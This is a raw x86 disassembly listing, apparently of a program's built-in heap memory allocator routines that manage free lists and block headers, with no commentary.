  401d3e:	c1 fa 02             	sar    $0x2,%edx
  401d41:	a1 1c d6 41 00       	mov    0x41d61c,%eax
  401d46:	33 c9                	xor    %ecx,%ecx
  401d48:	89 4c 90 f4          	mov    %ecx,-0xc(%eax,%edx,4)
  401d4c:	eb 4b                	jmp    0x401d99
  401d4e:	85 d2                	test   %edx,%edx
  401d50:	79 03                	jns    0x401d55
  401d52:	83 c2 03             	add    $0x3,%edx
  401d55:	c1 fa 02             	sar    $0x2,%edx
  401d58:	8b 0d 1c d6 41 00    	mov    0x41d61c,%ecx
  401d5e:	8b 1c 24             	mov    (%esp),%ebx
  401d61:	89 5c 91 f4          	mov    %ebx,-0xc(%ecx,%edx,4)
  401d65:	8b 00                	mov    (%eax),%eax
  401d67:	89 44 24 04          	mov    %eax,0x4(%esp)
  401d6b:	8b 04 24             	mov    (%esp),%eax
  401d6e:	8b 54 24 04          	mov    0x4(%esp),%edx
  401d72:	89 10                	mov    %edx,(%eax)
  401d74:	8b 44 24 04          	mov    0x4(%esp),%eax
  401d78:	8b 14 24             	mov    (%esp),%edx
  401d7b:	89 50 04             	mov    %edx,0x4(%eax)
  401d7e:	eb 19                	jmp    0x401d99
  401d80:	8b 00                	mov    (%eax),%eax
  401d82:	89 44 24 04          	mov    %eax,0x4(%esp)
  401d86:	8b 04 24             	mov    (%esp),%eax
  401d89:	8b 54 24 04          	mov    0x4(%esp),%edx
  401d8d:	89 10                	mov    %edx,(%eax)
  401d8f:	8b 44 24 04          	mov    0x4(%esp),%eax
  401d93:	8b 14 24             	mov    (%esp),%edx
  401d96:	89 50 04             	mov    %edx,0x4(%eax)
  401d99:	59                   	pop    %ecx
  401d9a:	5a                   	pop    %edx
  401d9b:	5b                   	pop    %ebx
  401d9c:	c3                   	ret
  401d9d:	8d 40 00             	lea    0x0(%eax),%eax
  401da0:	53                   	push   %ebx
  401da1:	51                   	push   %ecx
  401da2:	8b cc                	mov    %esp,%ecx
  401da4:	8b 15 20 d6 41 00    	mov    0x41d620,%edx
  401daa:	89 11                	mov    %edx,(%ecx)
  401dac:	eb 18                	jmp    0x401dc6
  401dae:	8b 11                	mov    (%ecx),%edx
  401db0:	8b 52 08             	mov    0x8(%edx),%edx
  401db3:	3b c2                	cmp    %edx,%eax
  401db5:	72 09                	jb     0x401dc0
  401db7:	8b 19                	mov    (%ecx),%ebx
  401db9:	03 53 0c             	add    0xc(%ebx),%edx
  401dbc:	3b c2                	cmp    %edx,%eax
  401dbe:	72 1d                	jb     0x401ddd
  401dc0:	8b 11                	mov    (%ecx),%edx
  401dc2:	8b 12                	mov    (%edx),%edx
  401dc4:	89 11                	mov    %edx,(%ecx)
  401dc6:	ba 20 d6 41 00       	mov    $0x41d620,%edx
  401dcb:	3b 11                	cmp    (%ecx),%edx
  401dcd:	75 df                	jne    0x401dae
  401dcf:	c7 05 c0 d5 41 00 03 	movl   $0x3,0x41d5c0
  401dd6:	00 00 00 
  401dd9:	33 c0                	xor    %eax,%eax
  401ddb:	89 01                	mov    %eax,(%ecx)
  401ddd:	8b 01                	mov    (%ecx),%eax
  401ddf:	5a                   	pop    %edx
  401de0:	5b                   	pop    %ebx
  401de1:	c3                   	ret
  401de2:	8b c0                	mov    %eax,%eax
  401de4:	53                   	push   %ebx
  401de5:	51                   	push   %ecx
  401de6:	8b ca                	mov    %edx,%ecx
  401de8:	83 e9 04             	sub    $0x4,%ecx
  401deb:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  401dee:	89 1c 24             	mov    %ebx,(%esp)
  401df1:	83 fa 10             	cmp    $0x10,%edx
  401df4:	7c 13                	jl     0x401e09
  401df6:	8b 14 24             	mov    (%esp),%edx
  401df9:	c7 02 07 00 00 80    	movl   $0x80000007,(%edx)
  401dff:	8b d1                	mov    %ecx,%edx
  401e01:	e8 da 01 00 00       	call   0x401fe0
  401e06:	5a                   	pop    %edx
  401e07:	5b                   	pop    %ebx
  401e08:	c3                   	ret
  401e09:	83 fa 04             	cmp    $0x4,%edx
  401e0c:	7c 0f                	jl     0x401e1d
  401e0e:	8b ca                	mov    %edx,%ecx
  401e10:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401e16:	89 08                	mov    %ecx,(%eax)
  401e18:	8b 04 24             	mov    (%esp),%eax
  401e1b:	89 08                	mov    %ecx,(%eax)
  401e1d:	5a                   	pop    %edx
  401e1e:	5b                   	pop    %ebx
  401e1f:	c3                   	ret
  401e20:	ff 05 ac d5 41 00    	incl   0x41d5ac
  401e26:	8b d0                	mov    %eax,%edx
  401e28:	83 ea 04             	sub    $0x4,%edx
  401e2b:	8b 12                	mov    (%edx),%edx
  401e2d:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  401e33:	83 ea 04             	sub    $0x4,%edx
  401e36:	01 15 b0 d5 41 00    	add    %edx,0x41d5b0
  401e3c:	e8 fb 06 00 00       	call   0x40253c
  401e41:	c3                   	ret
  401e42:	8b c0                	mov    %eax,%eax
  401e44:	83 fa 0c             	cmp    $0xc,%edx
  401e47:	7c 0e                	jl     0x401e57
  401e49:	83 ca 02             	or     $0x2,%edx
  401e4c:	89 10                	mov    %edx,(%eax)
  401e4e:	83 c0 04             	add    $0x4,%eax
  401e51:	e8 ca ff ff ff       	call   0x401e20
  401e56:	c3                   	ret
  401e57:	83 fa 04             	cmp    $0x4,%edx
  401e5a:	7c 0a                	jl     0x401e66
  401e5c:	8b ca                	mov    %edx,%ecx
  401e5e:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401e64:	89 08                	mov    %ecx,(%eax)
  401e66:	03 c2                	add    %edx,%eax
  401e68:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401e6b:	c3                   	ret
  401e6c:	53                   	push   %ebx
  401e6d:	56                   	push   %esi
  401e6e:	51                   	push   %ecx
  401e6f:	8b d0                	mov    %eax,%edx
  401e71:	83 ea 04             	sub    $0x4,%edx
  401e74:	8b 12                	mov    (%edx),%edx
  401e76:	8b ca                	mov    %edx,%ecx
  401e78:	81 e1 02 00 00 80    	and    $0x80000002,%ecx
  401e7e:	81 f9 02 00 00 80    	cmp    $0x80000002,%ecx
  401e84:	74 0a                	je     0x401e90
  401e86:	c7 05 c0 d5 41 00 04 	movl   $0x4,0x41d5c0
  401e8d:	00 00 00 
  401e90:	8b da                	mov    %edx,%ebx
  401e92:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  401e98:	2b c3                	sub    %ebx,%eax
  401e9a:	8b c8                	mov    %eax,%ecx
  401e9c:	33 11                	xor    (%ecx),%edx
  401e9e:	f7 c2 fe ff ff ff    	test   $0xfffffffe,%edx
  401ea4:	74 0a                	je     0x401eb0
  401ea6:	c7 05 c0 d5 41 00 05 	movl   $0x5,0x41d5c0
  401ead:	00 00 00 
  401eb0:	f6 01 01             	testb  $0x1,(%ecx)
  401eb3:	74 29                	je     0x401ede
  401eb5:	8b d0                	mov    %eax,%edx
  401eb7:	83 ea 0c             	sub    $0xc,%edx
  401eba:	8b 72 08             	mov    0x8(%edx),%esi
  401ebd:	2b c6                	sub    %esi,%eax
  401ebf:	89 04 24             	mov    %eax,(%esp)
  401ec2:	8b 04 24             	mov    (%esp),%eax
  401ec5:	3b 70 08             	cmp    0x8(%eax),%esi
  401ec8:	74 0a                	je     0x401ed4
  401eca:	c7 05 c0 d5 41 00 06 	movl   $0x6,0x41d5c0
  401ed1:	00 00 00 
  401ed4:	8b 04 24             	mov    (%esp),%eax
  401ed7:	e8 30 fe ff ff       	call   0x401d0c
  401edc:	03 de                	add    %esi,%ebx
  401ede:	8b c3                	mov    %ebx,%eax
  401ee0:	5a                   	pop    %edx
  401ee1:	5e                   	pop    %esi
  401ee2:	5b                   	pop    %ebx
  401ee3:	c3                   	ret
  401ee4:	53                   	push   %ebx
  401ee5:	56                   	push   %esi
  401ee6:	51                   	push   %ecx
  401ee7:	8b d8                	mov    %eax,%ebx
  401ee9:	33 f6                	xor    %esi,%esi
  401eeb:	8b 03                	mov    (%ebx),%eax
  401eed:	a9 00 00 00 80       	test   $0x80000000,%eax
  401ef2:	74 0b                	je     0x401eff
  401ef4:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  401ef9:	03 f0                	add    %eax,%esi
  401efb:	03 d8                	add    %eax,%ebx
  401efd:	8b 03                	mov    (%ebx),%eax
  401eff:	a8 02                	test   $0x2,%al
  401f01:	75 18                	jne    0x401f1b
  401f03:	89 1c 24             	mov    %ebx,(%esp)
  401f06:	8b 04 24             	mov    (%esp),%eax
  401f09:	e8 fe fd ff ff       	call   0x401d0c
  401f0e:	8b 04 24             	mov    (%esp),%eax
  401f11:	8b 40 08             	mov    0x8(%eax),%eax
  401f14:	03 f0                	add    %eax,%esi
  401f16:	03 d8                	add    %eax,%ebx
  401f18:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  401f1b:	8b c6                	mov    %esi,%eax
  401f1d:	5a                   	pop    %edx
  401f1e:	5e                   	pop    %esi
  401f1f:	5b                   	pop    %ebx
  401f20:	c3                   	ret
  401f21:	8d 40 00             	lea    0x0(%eax),%eax
  401f24:	53                   	push   %ebx
  401f25:	56                   	push   %esi
  401f26:	57                   	push   %edi
  401f27:	55                   	push   %ebp
  401f28:	83 c4 f4             	add    $0xfffffff4,%esp
  401f2b:	8b f2                	mov    %edx,%esi
  401f2d:	8b e8                	mov    %eax,%ebp
  401f2f:	33 db                	xor    %ebx,%ebx
  401f31:	8b c5                	mov    %ebp,%eax
  401f33:	e8 68 fe ff ff       	call   0x401da0
  401f38:	89 44 24 08          	mov    %eax,0x8(%esp)
  401f3c:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401f41:	0f 84 8f 00 00 00    	je     0x401fd6
  401f47:	8b 44 24 08          	mov    0x8(%esp),%eax
  401f4b:	8b 78 08             	mov    0x8(%eax),%edi
  401f4e:	8b c7                	mov    %edi,%eax
  401f50:	8b 54 24 08          	mov    0x8(%esp),%edx
  401f54:	03 42 0c             	add    0xc(%edx),%eax
  401f57:	8b d0                	mov    %eax,%edx
  401f59:	8d 0c 2e             	lea    (%esi,%ebp,1),%ecx
  401f5c:	2b d1                	sub    %ecx,%edx
  401f5e:	83 fa 0c             	cmp    $0xc,%edx
  401f61:	7f 04                	jg     0x401f67
  401f63:	8b f0                	mov    %eax,%esi
  401f65:	2b f5                	sub    %ebp,%esi
  401f67:	8b c5                	mov    %ebp,%eax
  401f69:	2b c7                	sub    %edi,%eax
  401f6b:	83 f8 0c             	cmp    $0xc,%eax
  401f6e:	7d 16                	jge    0x401f86
  401f70:	8b 44 24 08          	mov    0x8(%esp),%eax
  401f74:	8b d5                	mov    %ebp,%edx
  401f76:	2b 50 08             	sub    0x8(%eax),%edx
  401f79:	03 d6                	add    %esi,%edx
  401f7b:	8b cc                	mov    %esp,%ecx
  401f7d:	8b c7                	mov    %edi,%eax
  401f7f:	e8 1c fb ff ff       	call   0x401aa0
  401f84:	eb 0f                	jmp    0x401f95
  401f86:	8b cc                	mov    %esp,%ecx
  401f88:	8b d6                	mov    %esi,%edx
  401f8a:	83 ea 04             	sub    $0x4,%edx
  401f8d:	8d 45 04             	lea    0x4(%ebp),%eax
  401f90:	e8 0b fb ff ff       	call   0x401aa0
  401f95:	8b 3c 24             	mov    (%esp),%edi
  401f98:	85 ff                	test   %edi,%edi
  401f9a:	74 3a                	je     0x401fd6
  401f9c:	8b d7                	mov    %edi,%edx
  401f9e:	2b d5                	sub    %ebp,%edx
  401fa0:	8b c5                	mov    %ebp,%eax
  401fa2:	e8 3d fe ff ff       	call   0x401de4
  401fa7:	8b 54 24 08          	mov    0x8(%esp),%edx
  401fab:	8b 52 08             	mov    0x8(%edx),%edx
  401fae:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401fb2:	03 51 0c             	add    0xc(%ecx),%edx
  401fb5:	8b c7                	mov    %edi,%eax
  401fb7:	03 44 24 04          	add    0x4(%esp),%eax
  401fbb:	3b d0                	cmp    %eax,%edx
  401fbd:	76 0a                	jbe    0x401fc9
  401fbf:	8d 14 2e             	lea    (%esi,%ebp,1),%edx
  401fc2:	2b d0                	sub    %eax,%edx
  401fc4:	e8 7b fe ff ff       	call   0x401e44
  401fc9:	8b d4                	mov    %esp,%edx
  401fcb:	8b 44 24 08          	mov    0x8(%esp),%eax
  401fcf:	e8 fc f4 ff ff       	call   0x4014d0
  401fd4:	b3 01                	mov    $0x1,%bl
  401fd6:	8b c3                	mov    %ebx,%eax
  401fd8:	83 c4 0c             	add    $0xc,%esp
  401fdb:	5d                   	pop    %ebp
  401fdc:	5f                   	pop    %edi
  401fdd:	5e                   	pop    %esi
  401fde:	5b                   	pop    %ebx
  401fdf:	c3                   	ret
  401fe0:	53                   	push   %ebx
  401fe1:	56                   	push   %esi
  401fe2:	83 c4 f4             	add    $0xfffffff4,%esp
  401fe5:	8b da                	mov    %edx,%ebx
  401fe7:	8b f0                	mov    %eax,%esi
  401fe9:	89 34 24             	mov    %esi,(%esp)
  401fec:	8b 04 24             	mov    (%esp),%eax
  401fef:	89 58 08             	mov    %ebx,0x8(%eax)
  401ff2:	8b 04 24             	mov    (%esp),%eax
  401ff5:	03 c3                	add    %ebx,%eax
  401ff7:	83 e8 0c             	sub    $0xc,%eax
  401ffa:	89 58 08             	mov    %ebx,0x8(%eax)
  401ffd:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  402003:	7f 76                	jg     0x40207b
  402005:	8b c3                	mov    %ebx,%eax
  402007:	85 c0                	test   %eax,%eax
  402009:	79 03                	jns    0x40200e
  40200b:	83 c0 03             	add    $0x3,%eax
  40200e:	c1 f8 02             	sar    $0x2,%eax
  402011:	8b 15 1c d6 41 00    	mov    0x41d61c,%edx
  402017:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  40201b:	89 54 24 04          	mov    %edx,0x4(%esp)
  40201f:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  402024:	75 23                	jne    0x402049
  402026:	8b 15 1c d6 41 00    	mov    0x41d61c,%edx
  40202c:	8b 0c 24             	mov    (%esp),%ecx
  40202f:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  402033:	8b 04 24             	mov    (%esp),%eax
  402036:	8b 14 24             	mov    (%esp),%edx
  402039:	89 50 04             	mov    %edx,0x4(%eax)
  40203c:	8b 04 24             	mov    (%esp),%eax
  40203f:	8b 14 24             	mov    (%esp),%edx
  402042:	89 10                	mov    %edx,(%eax)
  402044:	e9 88 00 00 00       	jmp    0x4020d1
  402049:	8b 44 24 04          	mov    0x4(%esp),%eax
  40204d:	8b 00                	mov    (%eax),%eax
  40204f:	89 44 24 08          	mov    %eax,0x8(%esp)
  402053:	8b 04 24             	mov    (%esp),%eax
  402056:	8b 54 24 04          	mov    0x4(%esp),%edx
  40205a:	89 50 04             	mov    %edx,0x4(%eax)
  40205d:	8b 04 24             	mov    (%esp),%eax
  402060:	8b 54 24 08          	mov    0x8(%esp),%edx
  402064:	89 10                	mov    %edx,(%eax)
  402066:	8b 44 24 04          	mov    0x4(%esp),%eax
  40206a:	8b 14 24             	mov    (%esp),%edx
  40206d:	89 10                	mov    %edx,(%eax)
  40206f:	8b 44 24 08          	mov    0x8(%esp),%eax
  402073:	8b 14 24             	mov    (%esp),%edx
  402076:	89 50 04             	mov    %edx,0x4(%eax)
  402079:	eb 56                	jmp    0x4020d1
  40207b:	81 fb 00 3c 00 00    	cmp    $0x3c00,%ebx
  402081:	7c 0d                	jl     0x402090
  402083:	8b d3                	mov    %ebx,%edx
  402085:	8b c6                	mov    %esi,%eax
  402087:	e8 98 fe ff ff       	call   0x401f24
  40208c:	84 c0                	test   %al,%al
  40208e:	75 41                	jne    0x4020d1
  402090:	a1 10 d6 41 00       	mov    0x41d610,%eax
  402095:	89 44 24 04          	mov    %eax,0x4(%esp)
  402099:	8b 04 24             	mov    (%esp),%eax
  40209c:	a3 10 d6 41 00       	mov    %eax,0x41d610
  4020a1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4020a5:	8b 00                	mov    (%eax),%eax
  4020a7:	89 44 24 08          	mov    %eax,0x8(%esp)
  4020ab:	8b 04 24             	mov    (%esp),%eax
  4020ae:	8b 54 24 04          	mov    0x4(%esp),%edx
  4020b2:	89 50 04             	mov    %edx,0x4(%eax)
  4020b5:	8b 04 24             	mov    (%esp),%eax
  4020b8:	8b 54 24 08          	mov    0x8(%esp),%edx
  4020bc:	89 10                	mov    %edx,(%eax)
  4020be:	8b 44 24 04          	mov    0x4(%esp),%eax
  4020c2:	8b 14 24             	mov    (%esp),%edx
  4020c5:	89 10                	mov    %edx,(%eax)
  4020c7:	8b 44 24 08          	mov    0x8(%esp),%eax
  4020cb:	8b 14 24             	mov    (%esp),%edx
  4020ce:	89 50 04             	mov    %edx,0x4(%eax)
  4020d1:	83 c4 0c             	add    $0xc,%esp
  4020d4:	5e                   	pop    %esi
  4020d5:	5b                   	pop    %ebx
  4020d6:	c3                   	ret
  4020d7:	90                   	nop
  4020d8:	83 3d 14 d6 41 00 00 	cmpl   $0x0,0x41d614
  4020df:	7e 40                	jle    0x402121
  4020e1:	83 3d 14 d6 41 00 0c 	cmpl   $0xc,0x41d614
  4020e8:	7d 0c                	jge    0x4020f6
  4020ea:	c7 05 c0 d5 41 00 07 	movl   $0x7,0x41d5c0
  4020f1:	00 00 00 
  4020f4:	eb 2b                	jmp    0x402121
  4020f6:	a1 14 d6 41 00       	mov    0x41d614,%eax
  4020fb:	83 c8 02             	or     $0x2,%eax
  4020fe:	8b 15 18 d6 41 00    	mov    0x41d618,%edx
  402104:	89 02                	mov    %eax,(%edx)
  402106:	a1 18 d6 41 00       	mov    0x41d618,%eax
  40210b:	83 c0 04             	add    $0x4,%eax
  40210e:	e8 0d fd ff ff       	call   0x401e20
  402113:	33 c0                	xor    %eax,%eax
  402115:	a3 18 d6 41 00       	mov    %eax,0x41d618
  40211a:	33 c0                	xor    %eax,%eax
  40211c:	a3 14 d6 41 00       	mov    %eax,0x41d614
  402121:	c3                   	ret
  402122:	8b c0                	mov    %eax,%eax
  402124:	53                   	push   %ebx
  402125:	56                   	push   %esi
  402126:	57                   	push   %edi
  402127:	83 c4 f0             	add    $0xfffffff0,%esp
  40212a:	8b f0                	mov    %eax,%esi
  40212c:	8d 3c 24             	lea    (%esp),%edi
  40212f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402130:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402131:	8b fc                	mov    %esp,%edi
  402133:	e8 a0 ff ff ff       	call   0x4020d8
  402138:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40213c:	8b d7                	mov    %edi,%edx
  40213e:	b8 20 d6 41 00       	mov    $0x41d620,%eax
  402143:	e8 00 f3 ff ff       	call   0x401448
  402148:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  40214c:	85 db                	test   %ebx,%ebx
  40214e:	75 04                	jne    0x402154
  402150:	33 c0                	xor    %eax,%eax
  402152:	eb 52                	jmp    0x4021a6
  402154:	8b 07                	mov    (%edi),%eax
  402156:	3b d8                	cmp    %eax,%ebx
  402158:	73 0a                	jae    0x402164
  40215a:	e8 0d fd ff ff       	call   0x401e6c
  40215f:	29 07                	sub    %eax,(%edi)
  402161:	01 47 04             	add    %eax,0x4(%edi)
  402164:	8b 07                	mov    (%edi),%eax
  402166:	03 47 04             	add    0x4(%edi),%eax
  402169:	8b f3                	mov    %ebx,%esi
  40216b:	03 74 24 0c          	add    0xc(%esp),%esi
  40216f:	3b c6                	cmp    %esi,%eax
  402171:	73 08                	jae    0x40217b
  402173:	e8 6c fd ff ff       	call   0x401ee4
  402178:	01 47 04             	add    %eax,0x4(%edi)
  40217b:	8b 07                	mov    (%edi),%eax
  40217d:	03 47 04             	add    0x4(%edi),%eax
  402180:	3b f0                	cmp    %eax,%esi
  402182:	75 11                	jne    0x402195
  402184:	83 e8 04             	sub    $0x4,%eax
  402187:	ba 04 00 00 00       	mov    $0x4,%edx
  40218c:	e8 53 fc ff ff       	call   0x401de4
  402191:	83 6f 04 04          	subl   $0x4,0x4(%edi)
  402195:	8b 07                	mov    (%edi),%eax
  402197:	a3 18 d6 41 00       	mov    %eax,0x41d618
  40219c:	8b 47 04             	mov    0x4(%edi),%eax
  40219f:	a3 14 d6 41 00       	mov    %eax,0x41d614
  4021a4:	b0 01                	mov    $0x1,%al
  4021a6:	83 c4 10             	add    $0x10,%esp
  4021a9:	5f                   	pop    %edi
  4021aa:	5e                   	pop    %esi
  4021ab:	5b                   	pop    %ebx
  4021ac:	c3                   	ret
  4021ad:	8d 40 00             	lea    0x0(%eax),%eax
  4021b0:	53                   	push   %ebx
  4021b1:	83 c4 f8             	add    $0xfffffff8,%esp
  4021b4:	8b d8                	mov    %eax,%ebx
  4021b6:	8b d4                	mov    %esp,%edx
  4021b8:	8d 43 04             	lea    0x4(%ebx),%eax
  4021bb:	e8 f4 f6 ff ff       	call   0x4018b4
  4021c0:	83 3c 24 00          	cmpl   $0x0,(%esp)
  4021c4:	74 0b                	je     0x4021d1
  4021c6:	8b c4                	mov    %esp,%eax
  4021c8:	e8 57 ff ff ff       	call   0x402124
  4021cd:	84 c0                	test   %al,%al
  4021cf:	75 04                	jne    0x4021d5
  4021d1:	33 c0                	xor    %eax,%eax
  4021d3:	eb 02                	jmp    0x4021d7
  4021d5:	b0 01                	mov    $0x1,%al
  4021d7:	59                   	pop    %ecx
  4021d8:	5a                   	pop    %edx
  4021d9:	5b                   	pop    %ebx
  4021da:	c3                   	ret
  4021db:	90                   	nop
  4021dc:	53                   	push   %ebx
  4021dd:	56                   	push   %esi
  4021de:	83 c4 f8             	add    $0xfffffff8,%esp
  4021e1:	8b f2                	mov    %edx,%esi
  4021e3:	8b d8                	mov    %eax,%ebx
  4021e5:	8b cc                	mov    %esp,%ecx
  4021e7:	8d 56 04             	lea    0x4(%esi),%edx
  4021ea:	8b c3                	mov    %ebx,%eax
  4021ec:	e8 6b f7 ff ff       	call   0x40195c
  4021f1:	83 3c 24 00          	cmpl   $0x0,(%esp)
  4021f5:	74 0b                	je     0x402202
  4021f7:	8b c4                	mov    %esp,%eax
  4021f9:	e8 26 ff ff ff       	call   0x402124
  4021fe:	84 c0                	test   %al,%al
  402200:	75 04                	jne    0x402206
  402202:	33 c0                	xor    %eax,%eax
  402204:	eb 02                	jmp    0x402208
  402206:	b0 01                	mov    $0x1,%al
  402208:	59                   	pop    %ecx
  402209:	5a                   	pop    %edx
  40220a:	5e                   	pop    %esi
  40220b:	5b                   	pop    %ebx
  40220c:	c3                   	ret
  40220d:	8d 40 00             	lea    0x0(%eax),%eax
  402210:	51                   	push   %ecx
  402211:	8b d4                	mov    %esp,%edx
  402213:	33 c9                	xor    %ecx,%ecx
  402215:	89 0a                	mov    %ecx,(%edx)
  402217:	85 c0                	test   %eax,%eax
  402219:	79 03                	jns    0x40221e
  40221b:	83 c0 03             	add    $0x3,%eax
  40221e:	c1 f8 02             	sar    $0x2,%eax
  402221:	3d 00 04 00 00       	cmp    $0x400,%eax
  402226:	7f 19                	jg     0x402241
  402228:	8b 0d 1c d6 41 00    	mov    0x41d61c,%ecx
  40222e:	8b 4c 81 f4          	mov    -0xc(%ecx,%eax,4),%ecx
  402232:	89 0a                	mov    %ecx,(%edx)
  402234:	83 3a 00             	cmpl   $0x0,(%edx)
  402237:	75 08                	jne    0x402241
  402239:	40                   	inc    %eax
  40223a:	3d 01 04 00 00       	cmp    $0x401,%eax
  40223f:	75 e7                	jne    0x402228
  402241:	8b 02                	mov    (%edx),%eax
  402243:	5a                   	pop    %edx
  402244:	c3                   	ret
  402245:	8d 40 00             	lea    0x0(%eax),%eax
  402248:	53                   	push   %ebx
  402249:	56                   	push   %esi
  40224a:	57                   	push   %edi
  40224b:	55                   	push   %ebp
  40224c:	83 c4 f4             	add    $0xfffffff4,%esp
  40224f:	8b d8                	mov    %eax,%ebx
  402251:	8d 74 24 08          	lea    0x8(%esp),%esi
  402255:	bf 10 d6 41 00       	mov    $0x41d610,%edi
  40225a:	bd 14 d6 41 00       	mov    $0x41d614,%ebp
  40225f:	a1 08 d6 41 00       	mov    0x41d608,%eax
  402264:	89 06                	mov    %eax,(%esi)
  402266:	8b 06                	mov    (%esi),%eax
  402268:	3b 58 08             	cmp    0x8(%eax),%ebx
  40226b:	0f 8e ab 00 00 00    	jle    0x40231c
  402271:	8b 07                	mov    (%edi),%eax
  402273:	89 06                	mov    %eax,(%esi)
  402275:	8b 06                	mov    (%esi),%eax
  402277:	8b 40 08             	mov    0x8(%eax),%eax
  40227a:	3b d8                	cmp    %eax,%ebx
  40227c:	0f 8e 9a 00 00 00    	jle    0x40231c
  402282:	8b 16                	mov    (%esi),%edx
  402284:	89 5a 08             	mov    %ebx,0x8(%edx)
  402287:	8b 16                	mov    (%esi),%edx
  402289:	8b 52 04             	mov    0x4(%edx),%edx
  40228c:	89 16                	mov    %edx,(%esi)
  40228e:	8b 16                	mov    (%esi),%edx
  402290:	3b 5a 08             	cmp    0x8(%edx),%ebx
  402293:	7f f2                	jg     0x402287
  402295:	8b 17                	mov    (%edi),%edx
  402297:	89 42 08             	mov    %eax,0x8(%edx)
  40229a:	8b 06                	mov    (%esi),%eax
  40229c:	3b 07                	cmp    (%edi),%eax
  40229e:	74 06                	je     0x4022a6
  4022a0:	8b 06                	mov    (%esi),%eax
  4022a2:	89 07                	mov    %eax,(%edi)
  4022a4:	eb 76                	jmp    0x40231c
  4022a6:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  4022ac:	7f 0e                	jg     0x4022bc
  4022ae:	8b c3                	mov    %ebx,%eax
  4022b0:	e8 5b ff ff ff       	call   0x402210
  4022b5:	89 06                	mov    %eax,(%esi)
  4022b7:	83 3e 00             	cmpl   $0x0,(%esi)
  4022ba:	75 60                	jne    0x40231c
  4022bc:	8b c3                	mov    %ebx,%eax
  4022be:	e8 ed fe ff ff       	call   0x4021b0
  4022c3:	84 c0                	test   %al,%al
  4022c5:	75 0a                	jne    0x4022d1
  4022c7:	33 c0                	xor    %eax,%eax
  4022c9:	89 04 24             	mov    %eax,(%esp)
  4022cc:	e9 b4 00 00 00       	jmp    0x402385
  4022d1:	3b 5d 00             	cmp    0x0(%ebp),%ebx
  4022d4:	7f 89                	jg     0x40225f
  4022d6:	29 5d 00             	sub    %ebx,0x0(%ebp)
  4022d9:	83 7d 00 0c          	cmpl   $0xc,0x0(%ebp)
  4022dd:	7d 08                	jge    0x4022e7
  4022df:	03 5d 00             	add    0x0(%ebp),%ebx
  4022e2:	33 c0                	xor    %eax,%eax
  4022e4:	89 45 00             	mov    %eax,0x0(%ebp)
  4022e7:	a1 18 d6 41 00       	mov    0x41d618,%eax
  4022ec:	89 44 24 04          	mov    %eax,0x4(%esp)
  4022f0:	01 1d 18 d6 41 00    	add    %ebx,0x41d618
  4022f6:	8b c3                	mov    %ebx,%eax
  4022f8:	83 c8 02             	or     $0x2,%eax
  4022fb:	8b 54 24 04          	mov    0x4(%esp),%edx
  4022ff:	89 02                	mov    %eax,(%edx)
  402301:	8b 44 24 04          	mov    0x4(%esp),%eax
  402305:	83 c0 04             	add    $0x4,%eax
  402308:	89 04 24             	mov    %eax,(%esp)
  40230b:	ff 05 ac d5 41 00    	incl   0x41d5ac
  402311:	83 eb 04             	sub    $0x4,%ebx
  402314:	01 1d b0 d5 41 00    	add    %ebx,0x41d5b0
  40231a:	eb 69                	jmp    0x402385
  40231c:	8b 06                	mov    (%esi),%eax
  40231e:	e8 e9 f9 ff ff       	call   0x401d0c
  402323:	8b 06                	mov    (%esi),%eax
  402325:	8b 50 08             	mov    0x8(%eax),%edx
  402328:	8b c2                	mov    %edx,%eax
  40232a:	2b c3                	sub    %ebx,%eax
  40232c:	83 f8 0c             	cmp    $0xc,%eax
  40232f:	7c 0c                	jl     0x40233d
  402331:	8b 16                	mov    (%esi),%edx
  402333:	03 d3                	add    %ebx,%edx
  402335:	92                   	xchg   %eax,%edx
  402336:	e8 a5 fc ff ff       	call   0x401fe0
  40233b:	eb 1e                	jmp    0x40235b
  40233d:	8b da                	mov    %edx,%ebx
  40233f:	8b 06                	mov    (%esi),%eax
  402341:	3b 07                	cmp    (%edi),%eax
  402343:	75 07                	jne    0x40234c
  402345:	8b 06                	mov    (%esi),%eax
  402347:	8b 40 04             	mov    0x4(%eax),%eax
  40234a:	89 07                	mov    %eax,(%edi)
  40234c:	8b 06                	mov    (%esi),%eax
  40234e:	03 c3                	add    %ebx,%eax
  402350:	89 44 24 04          	mov    %eax,0x4(%esp)
  402354:	8b 44 24 04          	mov    0x4(%esp),%eax
  402358:	83 20 fe             	andl   $0xfffffffe,(%eax)
  40235b:	8b 06                	mov    (%esi),%eax
  40235d:	89 44 24 04          	mov    %eax,0x4(%esp)
  402361:	8b c3                	mov    %ebx,%eax
  402363:	83 c8 02             	or     $0x2,%eax
  402366:	8b 54 24 04          	mov    0x4(%esp),%edx
  40236a:	89 02                	mov    %eax,(%edx)
  40236c:	8b 44 24 04          	mov    0x4(%esp),%eax
  402370:	83 c0 04             	add    $0x4,%eax
  402373:	89 04 24             	mov    %eax,(%esp)
  402376:	ff 05 ac d5 41 00    	incl   0x41d5ac
  40237c:	83 eb 04             	sub    $0x4,%ebx
  40237f:	01 1d b0 d5 41 00    	add    %ebx,0x41d5b0
  402385:	8b 04 24             	mov    (%esp),%eax
  402388:	83 c4 0c             	add    $0xc,%esp
  40238b:	5d                   	pop    %ebp
  40238c:	5f                   	pop    %edi
  40238d:	5e                   	pop    %esi
  40238e:	5b                   	pop    %ebx
  40238f:	c3                   	ret
  402390:	55                   	push   %ebp
  402391:	8b ec                	mov    %esp,%ebp
